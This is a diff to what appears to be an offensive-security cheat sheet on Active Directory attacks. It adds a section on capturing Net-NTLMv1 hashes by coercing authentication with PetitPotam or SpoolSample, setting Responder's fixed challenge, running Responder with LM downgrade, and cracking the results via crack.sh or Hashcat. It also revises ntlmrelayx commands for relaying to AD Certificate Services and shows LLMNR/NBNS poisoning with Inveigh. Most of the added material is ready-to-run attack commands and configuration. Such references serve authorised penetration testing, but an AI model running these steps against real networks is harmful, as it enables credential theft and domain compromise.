@@ -58,7 +58,8 @@
     - [OverPass-the-Hash (pass the key)](#overpass-the-hash-pass-the-key)
       - [Using impacket](#using-impacket)
       - [Using Rubeus](#using-rubeus)
-    - [Capturing and cracking NTLMv2 hashes](#capturing-and-cracking-ntlmv2-hashes)
+    - [Capturing and cracking Net-NTLMv1/NTLMv1 hashes](#capturing-and-cracking-net-ntlmv1ntlmv1-hashes)
+    - [Capturing and cracking Net-NTLMv2/NTLMv2 hashes](#capturing-and-cracking-net-ntlmv2ntlmv2-hashes)
     - [Man-in-the-Middle attacks & relaying](#man-in-the-middle-attacks--relaying)
       - [MS08-068 NTLM reflection](#ms08-068-ntlm-reflection)
       - [SMB Signing Disabled and IPv4](#smb-signing-disabled-and-ipv4)
@@ -1665,7 +1666,39 @@ klist
 .\Rubeus.exe asktgt /user:Administrator /rc4:[NTLMHASH] /createnetonly:C:\Windows\System32\cmd.exe
 ```
 
-### Capturing and cracking NTLMv2 hashes
+
+
+### Capturing and cracking Net-NTLMv1/NTLMv1 hashes
+
+> Net-NTLM (NTLMv1) hashes are used for network authentication (they are derived from a challenge/response algorithm and are based on the user's NT hash. 
+
+:information_source: : Coerce a callback using PetitPotam or SpoolSample on an affected machine, to get the machine account Net-NTLM v1 hash
+
+Requirements:
+* LmCompatibilityLevel = 0x1: Send LM & NTLM (`reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v lmcompatibilitylevel`)
+
+
+* Capturing using Responder: Edit the /etc/responder/Responder.conf file to include the magical **1122334455667788** challenge
+    ```ps1
+    HTTPS = On
+    DNS = On
+    LDAP = On
+    ...
+    ; Custom challenge.
+    ; Use "Random" for generating a random challenge for each requests (Default)
+    Challenge = 1122334455667788
+    ```
+* Fire Responder: `responder -I eth0 --lm`
+* If you got some `NTLMv1 hashes`, you need to format then submit them on [crack.sh](https://crack.sh/netntlm/), or crack them with Hashcat/John
+    ```ps1
+    username::hostname:response:response:challenge -> NTHASH:response
+    NTHASH:F35A3FE17DCB31F9BE8A8004B3F310C150AFA36195554972
+    ```
+
+:warning: NTLMv1 with SSP(Security Support Provider) changes the server challenge and is not quite ideal for the attack, but it can be used.
+
+
+### Capturing and cracking Net-NTLMv2/NTLMv2 hashes
 
 If any user in the network tries to access a machine and mistype the IP or the name, Responder will answer for it and ask for the NTLMv2 hash to access the resource. Responder will poison `LLMNR`, `MDNS` and `NETBIOS` requests on the network.
 
@@ -1679,6 +1712,7 @@ PS > .\inveighzero.exe -FileOutput Y -NBNS Y -mDNS Y -Proxy Y -MachineAccounts Y
 # https://github.com/EmpireProject/Empire/blob/master/data/module_source/collection/Invoke-Inveigh.ps1
 PS > Invoke-Inveigh [-IP '10.10.10.10'] -ConsoleOutput Y -FileOutput Y -NBNS Y –mDNS Y –Proxy Y -MachineAccounts Y
 ```
+
 
 ### Man-in-the-Middle attacks & relaying
 
@@ -1921,8 +1955,9 @@ Require [Impacket PR #1101](https://github.com/SecureAuthCorp/impacket/pull/1101
 * Version 1: NTLM Relay + Rubeus + PetitPotam
     ```powershell
     impacket> python3 ntlmrelayx.py -t http://<ca-server>/certsrv/certfnsh.asp -smb2support --adcs
-    impacket> python3 ./examples/ntlmrelayx.py -t http://10.10.10.10/certsrv/certfnsh.asp -smb2support --adcs --template workstation
-    # Templates: workstation, DomainController, Machine; KerberosAuthentication
+    impacket> python3 ./examples/ntlmrelayx.py -t http://10.10.10.10/certsrv/certfnsh.asp -smb2support --adcs --template VulnTemplate
+    # For a member server or workstation, the template would be "Computer".
+    # Other templates: workstation, DomainController, Machine, KerberosAuthentication
 
     # Coerce the authentication via MS-ESFRPC EfsRpcOpenFileRaw function with petitpotam 
     # You can also use any other way to coerce the authentication like PrintSpooler via MS-RPRN
